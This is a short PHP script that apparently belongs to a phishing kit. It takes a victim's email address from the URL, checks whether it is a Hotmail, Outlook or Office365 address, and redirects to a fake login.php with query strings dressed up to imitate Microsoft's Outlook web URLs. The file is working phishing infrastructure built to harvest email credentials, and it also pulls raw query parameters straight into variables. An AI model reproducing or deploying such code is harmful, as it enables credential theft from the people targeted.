<?php 
require_once 'kancha.php';
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
		header('Location: login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.123InboxLight.aspxn.1774256418&fid.1252899645289964213InboxLight_Product-userid&userid='.$userid);
	}
	
	else {
		header('Location: login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-userid&userid='.$userid);
	}
		
?>